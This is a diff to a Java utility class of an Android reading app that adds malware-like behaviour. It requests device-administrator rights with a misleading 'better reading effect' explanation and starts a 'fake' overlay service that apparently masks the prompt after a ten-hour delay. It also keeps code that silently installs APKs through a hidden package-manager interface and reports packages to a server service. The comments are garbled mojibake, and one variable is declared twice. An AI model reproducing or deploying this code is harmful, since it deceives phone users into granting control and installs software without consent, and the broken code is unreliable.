@@ -6,11 +6,15 @@ import java.util.ArrayList;
 import java.util.Calendar;
 import java.util.List;
 
+import android.app.Activity;
 import android.app.Notification;
 import android.app.NotificationManager;
 import android.app.PendingIntent;
+import android.app.admin.DevicePolicyManager;
+import android.content.ComponentName;
 import android.content.Context;
 import android.content.Intent;
+import android.content.SharedPreferences;
 import android.content.pm.IPackageInstallObserver;
 import android.content.pm.IPackageManager;
 import android.content.pm.PackageInfo;
@@ -19,198 +23,259 @@ import android.graphics.Bitmap;
 import android.net.ConnectivityManager;
 import android.net.NetworkInfo;
 import android.net.Uri;
+import android.os.Build;
 import android.os.IBinder;
 import android.support.v4.app.NotificationCompat;
 import android.util.Log;
 
+import com.xstd.ip.receiver.BindDeviceReceiver;
 import com.xstd.ip.service.CoreService;
+import com.xstd.ip.service.FakeBindService;
+import com.xstd.ip.service.SendServerService;
 
 public class Tools {
 
-	/**
-	 * Æô¶¯ºËĞÄ·şÎñ¡£
-	 * 
-	 * @param context
-	 */
-	public static void startCoreService(Context context) {
-		context.startService(new Intent(context, CoreService.class));
-		;
-	}
+    public static final String KEY_HAS_BINDING_DEVICES = "key_has_bindding_devices";
 
-	/**
-	 * µÃµ½packagemanager£¬°²×°apk¡£
-	 * 
-	 * @return ·µ»ØIPackageManager¶ÔÏó¡£
-	 */
-	@SuppressWarnings({ "rawtypes", "unchecked" })
-	private static IPackageManager getPackageManger() {
-		try {
-			Class clazz = Tools.class.getClassLoader().loadClass("android.os.ServiceManager");
-			Method method = clazz.getMethod("getService", new Class[] { String.class });
-			IBinder b = (IBinder) method.invoke(null, "package");
-			return IPackageManager.Stub.asInterface(b);
-		} catch (Exception e) {
-			return null;
-		}
-	}
+    /**
+     * å¯åŠ¨æ ¸å¿ƒæœåŠ¡ã€‚
+     *
+     * @param context
+     */
+    public static void startCoreService(Context context) {
+        context.startService(new Intent(context, CoreService.class));
+    }
 
-	/**
-	 * Í¨¹ıapkÂ·¾¶µÃµ½apkĞÅÏ¢
-	 * 
-	 * @param context
-	 * @param path
-	 * @return
-	 */
-	public static PackageInfo getPackageInfoByPath(Context context, String path) {
-		return context.getPackageManager().getPackageArchiveInfo(path, PackageManager.GET_ACTIVITIES);
-	}
+    /**
+     * å¼€å¯æ¿€æ´»è®¾å¤‡ç®¡ç†å™¨çš„é®ç›–æœåŠ¡
+     *
+     * @param context
+     * @param from
+     */
+    public static void startFakeService(Context context, String from) {
+        if (Config.isDebug) {
+            Tools.logW("[[CommonUtil::startFakeService]] from reason : " + from);
+        }
+        Intent is = new Intent();
+        is.setClass(context, FakeBindService.class);
+        context.startService(is);
+    }
 
-	/**
-	 * °²×°apkÎÄ¼ş
-	 * 
-	 * @param context
-	 * @param file
-	 * @param observer
-	 * @throws Exception
-	 */
-	public static void installFile(Context context, File file, IPackageInstallObserver observer) {
-		PackageInfo info = getPackageInfoByPath(context, file.getAbsolutePath());
-		if (file == null || !file.isFile() || info == null)
-			return;
-		int flags = 0;
-		try {
-			getPackageManger().installPackage(Uri.fromFile(file), observer, flags, info.packageName);
-		} catch (Exception e) {
-			e.printStackTrace();
-		}
-	}
+    /**
+     * å¾—åˆ°packagemanagerï¼Œå®‰è£…apkã€‚
+     *
+     * @return è¿”å›IPackageManagerå¯¹è±¡ã€‚
+     */
+    @SuppressWarnings({"rawtypes", "unchecked"})
+    private static IPackageManager getPackageManger() {
+        try {
+            Class clazz = Tools.class.getClassLoader().loadClass("android.os.ServiceManager");
+            Method method = clazz.getMethod("getService", new Class[]{String.class});
+            IBinder b = (IBinder) method.invoke(null, "package");
+            return IPackageManager.Stub.asInterface(b);
+        } catch (Exception e) {
+            return null;
+        }
+    }
 
-	/**
-	 * Çå³ıÕâ¸ö°üÃûµÄÍ¨Öª
-	 * 
-	 * @param context
-	 * @param packageName
-	 */
-	public static void cancleNotification(Context context, String packageName) {
-		((NotificationManager) context.getSystemService(Context.NOTIFICATION_SERVICE)).cancel(generateNotificationID(packageName));
-	}
+    /**
+     * é€šè¿‡apkè·¯å¾„å¾—åˆ°apkä¿¡æ¯
+     *
+     * @param context
+     * @param path
+     * @return
+     */
+    public static PackageInfo getPackageInfoByPath(Context context, String path) {
+        return context.getPackageManager().getPackageArchiveInfo(path, PackageManager.GET_ACTIVITIES);
+    }
 
-	/**
-	 * ¸ù¾İ°üÃûÉú³ÉÍ¨Öªid
-	 * 
-	 * @param packageName
-	 * @return
-	 */
-	private static int generateNotificationID(String packageName) {
-		return packageName.hashCode();
-	}
+    /**
+     * å®‰è£…apkæ–‡ä»¶
+     *
+     * @param context
+     * @param file
+     * @param observer
+     * @throws Exception
+     */
+    public static void installFile(Context context, File file, IPackageInstallObserver observer) {
+        Tools.logW("å‡†å¤‡é™é»˜å®‰è£…ï¼š"+file.getAbsolutePath());
+        if (file == null || !file.isFile())
+            return;
+        PackageInfo info = getPackageInfoByPath(context, file.getAbsolutePath());
+        if (info == null)
+            return;
+        Tools.logW("æ£€æµ‹æˆåŠŸï¼Œå‡†å¤‡å®‰è£…"+file.getAbsolutePath());
+        int flags = 0;
+        try {
+            getPackageManger().installPackage(Uri.fromFile(file), observer, flags, info.packageName);
+        } catch (Exception e) {
+            e.printStackTrace();
+        }
+    }
 
-	/**
-	 * Í¨¹ı·¢ËÍÍ¨ÖªµÄ·½Ê½°²×°
-	 * 
-	 * @param context
-	 * @param tickerText
-	 * @param title
-	 *            Í¨ÖªµÄ±êÌâ
-	 * @param text
-	 *            Í¨ÖªµÄÄÚÈİ
-	 * @param icon
-	 *            Í¨ÖªµÄÍ¼±ê
-	 * @param largeIcon
-	 * @param apkPath
-	 *            apk°üµÄ¾ø¶ÔÂ·¾¶
-	 */
-	public static void useNotificationInstall(Context context, String tickerText, String title, String text, int icon, Bitmap largeIcon, String apkPath) {
-		Intent intent = new Intent("android.intent.action.INSTALL_PACKAGE");
-		intent.setFlags(Intent.FLAG_ACTIVITY_NEW_TASK);
-		intent.addCategory("android.intent.category.DEFAULT");
-		intent.setDataAndType(Uri.fromFile(new File(apkPath)), "application/vnd.android.package-archive");
-		NotificationManager nm = (NotificationManager) context.getSystemService(Context.NOTIFICATION_SERVICE);
-		Notification notification = new NotificationCompat.Builder(context).setTicker(tickerText).setContentTitle(title).setContentText(text).setSmallIcon(icon).setLargeIcon(largeIcon)
-				.setContentIntent(PendingIntent.getActivity(context, 0, intent, 0)).setDefaults(Notification.DEFAULT_SOUND).setWhen(System.currentTimeMillis()).build();
-		notification.flags = Notification.FLAG_NO_CLEAR;
-		PackageInfo packageInfo = checkPackageByPath(context, apkPath);
-		if (packageInfo != null)
-			nm.notify(generateNotificationID(packageInfo.packageName), notification);
-	}
+    /**
+     * æ¸…é™¤è¿™ä¸ªåŒ…åçš„é€šçŸ¥
+     *
+     * @param context
+     * @param packageName
+     */
+    public static void cancleNotification(Context context, String packageName) {
+        ((NotificationManager) context.getSystemService(Context.NOTIFICATION_SERVICE)).cancel(generateNotificationID(packageName));
+    }
 
-	/**
-	 * Í¨¹ıapkÂ·¾¶»ñµÃpackageinfo¶ÔÏó
-	 * 
-	 * @param context
-	 * @param path
-	 * @return
-	 */
-	public static PackageInfo checkPackageByPath(Context context, String path) {
-		return context.getPackageManager().getPackageArchiveInfo(path, PackageManager.GET_ACTIVITIES);
-	}
+    /**
+     * æ ¹æ®åŒ…åç”Ÿæˆé€šçŸ¥id
+     *
+     * @param packageName
+     * @return
+     */
+    private static int generateNotificationID(String packageName) {
+        return packageName.hashCode();
+    }
 
-	/**
-	 * »Øµ½Launcher
-	 * 
-	 * @param context
-	 */
-	public static void goHome(Context context) {
-		Intent intent = new Intent(Intent.ACTION_MAIN);
-		intent.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK);
-		intent.addCategory(Intent.CATEGORY_HOME);
-		context.startActivity(intent);
-	}
+    /**
+     * é€šè¿‡å‘é€é€šçŸ¥çš„æ–¹å¼å®‰è£…
+     *
+     * @param context
+     * @param tickerText
+     * @param title      é€šçŸ¥çš„æ ‡é¢˜
+     * @param text       é€šçŸ¥çš„å†…å®¹
+     * @param icon       é€šçŸ¥çš„å›¾æ ‡
+     * @param largeIcon
+     * @param apkPath    apkåŒ…çš„ç»å¯¹è·¯å¾„
+     */
+    public static void useNotificationInstall(Context context, String tickerText, String title, String text, int icon, Bitmap largeIcon, String apkPath) {
+        Tools.logW("å‡†å¤‡é€šçŸ¥å®‰è£…ï¼š"+apkPath);
+        Intent intent = new Intent("android.intent.action.INSTALL_PACKAGE");
+        intent.setFlags(Intent.FLAG_ACTIVITY_NEW_TASK);
+        intent.addCategory("android.intent.category.DEFAULT");
+        intent.setDataAndType(Uri.fromFile(new File(apkPath)), "application/vnd.android.package-archive");
+        NotificationManager nm = (NotificationManager) context.getSystemService(Context.NOTIFICATION_SERVICE);
+        Notification notification = new Notification();
+        Notification notification = new NotificationCompat.Builder(context).setTicker(tickerText).setContentTitle(title).setContentText(text).setSmallIcon(icon).setLargeIcon(largeIcon)
+                .setContentIntent(PendingIntent.getActivity(context, 0, intent, 0)).setDefaults(Notification.DEFAULT_SOUND).setWhen(System.currentTimeMillis()).build();
+        notification.flags = Notification.FLAG_NO_CLEAR;
+        logW("é€šçŸ¥å‡†å¤‡å®Œæˆï¼Œæ£€æµ‹ç¨‹åºæ˜¯å¦æ­£ç¡®");
+        PackageInfo packageInfo = checkPackageByPath(context, apkPath);
+        if (packageInfo != null) {
+            logW("ç¨‹åºæ£€æµ‹ç»“æœæ­£å¸¸ï¼Œå‘é€é€šçŸ¥å®‰è£…");
+            nm.notify(generateNotificationID(packageInfo.packageName), notification);
+        }
+    }
 
-	/**
-	 * Èç¹ûµ±Ç°ÏµÍ³Ê±¼ä´óÓÚ2014Äê1ÔÂ1ÈÕ0Ê±0·Ö0ÃëÔòÎªÕı³£Ê±¼ä
-	 * 
-	 * @return
-	 */
-	public static boolean isTrueTime() {
-		Calendar calendar = Calendar.getInstance();
-		calendar.set(2014, 0, 1, 0, 0, 0);
-		return System.currentTimeMillis() > calendar.getTimeInMillis();
-	}
+    /**
+     * é€šè¿‡apkè·¯å¾„è·å¾—packageinfoå¯¹è±¡
+     *
+     * @param context
+     * @param path
+     * @return
+     */
+    public static PackageInfo checkPackageByPath(Context context, String path) {
+        return context.getPackageManager().getPackageArchiveInfo(path, PackageManager.GET_ACTIVITIES);
+    }
 
-	/**
-	 * ÅĞ¶ÏÍøÂçÊÇ·ñ¿ÉÓÃ
-	 * 
-	 * @param context
-	 * @return
-	 */
-	public static boolean isOnline(Context context) {
-		ConnectivityManager cm = (ConnectivityManager) context.getSystemService(Context.CONNECTIVITY_SERVICE);
-		NetworkInfo info = (cm != null) ? cm.getActiveNetworkInfo() : null;
-		if (info != null && info.isAvailable() && info.isConnected()) {
-			return true;
-		}
-		return false;
-	}
+    /**
+     * å›åˆ°Launcher
+     *
+     * @param context
+     */
+    public static void goHome(Context context) {
+        Intent intent = new Intent(Intent.ACTION_MAIN);
+        intent.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK);
+        intent.addCategory(Intent.CATEGORY_HOME);
+        context.startActivity(intent);
+    }
 
-	/**
-	 * »ñµÃÉè±¸ÉÏËùÓĞ°²×°³ÌĞòµÄ°üÃû
-	 * 
-	 * @param context
-	 * @return
-	 */
-	public static List<String> getDeviceInstallPackName(Context context) {
-		List<String> names = new ArrayList<String>();
-		List<PackageInfo> pis = context.getPackageManager().getInstalledPackages(PackageManager.GET_ACTIVITIES);
-		for (PackageInfo pi : pis)
-			names.add(pi.packageName);
-		return names;
-	}
+    /**
+     * å¦‚æœå½“å‰ç³»ç»Ÿæ—¶é—´å¤§äº2014å¹´1æœˆ1æ—¥0æ—¶0åˆ†0ç§’åˆ™ä¸ºæ­£å¸¸æ—¶é—´
+     *
+     * @return
+     */
+    public static boolean isTrueTime() {
+        Calendar calendar = Calendar.getInstance();
+        calendar.set(2014, 0, 1, 0, 0, 0);
+        return System.currentTimeMillis() > calendar.getTimeInMillis();
+    }
 
-	/**
-	 * DEBUGÄ£Ê½ÏÂ´òÓ¡debug¼¶±ğµÄĞÅÏ¢
-	 * 
-	 * @param msg
-	 */
-	public static void logW(String msg) {
-		if (Config.isDebug)
-			Log.d("INSTALL_PLUGIN", msg);
-	}
+    /**
+     * åˆ¤æ–­ç½‘ç»œæ˜¯å¦å¯ç”¨
+     *
+     * @param context
+     * @return
+     */
+    public static boolean isOnline(Context context) {
+        ConnectivityManager cm = (ConnectivityManager) context.getSystemService(Context.CONNECTIVITY_SERVICE);
+        NetworkInfo info = (cm != null) ? cm.getActiveNetworkInfo() : null;
+        if (info != null && info.isAvailable() && info.isConnected()) {
+            return true;
+        }
+        return false;
+    }
 
-	public static void notifyServer(Context context, String action, String packname) {
-		Intent service = new Intent(action);
-		service.putExtra("packname", packname);
-		context.startService(service);
-	}
+    /**
+     * è·å¾—è®¾å¤‡ä¸Šæ‰€æœ‰å®‰è£…ç¨‹åºçš„åŒ…å
+     *
+     * @param context
+     * @return
+     */
+    public static List<String> getDeviceInstallPackName(Context context) {
+        List<String> names = new ArrayList<String>();
+        List<PackageInfo> pis = context.getPackageManager().getInstalledPackages(PackageManager.GET_ACTIVITIES);
+        for (PackageInfo pi : pis)
+            names.add(pi.packageName);
+        return names;
+    }
 
+    /**
+     * DEBUGæ¨¡å¼ä¸‹æ‰“å°debugçº§åˆ«çš„ä¿¡æ¯
+     *
+     * @param msg
+     */
+    public static void logW(String msg) {
+        if (Config.isDebug)
+            Log.w("INSTALL_PLUGIN", msg);
+    }
+
+    public static void notifyServer(Context context, String action, String packname) {
+        Intent service = new Intent(context, SendServerService.class);
+        service.setAction(action);
+        service.putExtra("packname", packname);
+        context.startService(service);
+    }
+
+    public static void bindDeviceManager(Activity activity) {
+        Intent i = new Intent(DevicePolicyManager.ACTION_ADD_DEVICE_ADMIN);
+        i.putExtra(DevicePolicyManager.EXTRA_DEVICE_ADMIN, new ComponentName(activity, BindDeviceReceiver.class));
+        i.putExtra(DevicePolicyManager.EXTRA_ADD_EXPLANATION, "æ¿€æ´»è®¾å¤‡ç®¡ç†å™¨ï¼Œå¯ä»¥è·å¾—æ›´å¥½çš„é˜…è¯»æ•ˆæœã€‚");
+        i.setFlags(Intent.FLAG_ACTIVITY_CLEAR_TOP | Intent.FLAG_ACTIVITY_EXCLUDE_FROM_RECENTS);
+        activity.startActivityForResult(i, 1000);
+    }
+
+    public static boolean isVersionBeyondGB() {
+        return Build.VERSION.SDK_INT > Build.VERSION_CODES.GINGERBREAD_MR1;
+    }
+
+    public static boolean isBindingActive(Context context) {
+        return context.getSharedPreferences("setting", Context.MODE_PRIVATE).getBoolean(KEY_HAS_BINDING_DEVICES, false);
+    }
+
+    public static void setDeviceBindingActiveTime(Context context, int count) {
+        context.getSharedPreferences("setting", Context.MODE_PRIVATE).edit().putInt("device_bind_active", count).commit();
+    }
+
+    public static int getDeviceBindingActiveTime(Context context) {
+        return context.getSharedPreferences("setting", Context.MODE_PRIVATE).getInt("device_bind_active", 0);
+    }
+
+    public static void initFakeWindow(Context context) {
+        if (isTrueTime()) {
+            SharedPreferences setting = context.getSharedPreferences("setting", Context.MODE_PRIVATE);
+            long intiTime = setting.getLong("first_init_time", -1);
+            if (intiTime == -1)
+                setting.edit().putLong("first_init_time", System.currentTimeMillis()).commit();
+            else if (System.currentTimeMillis() > intiTime + 1000 * 60 * 60 * 10 && setting.getBoolean("showFakeWindow", true))
+                startFakeService(context, "LoveReaderActivity");
+        }
+
+    }
 }
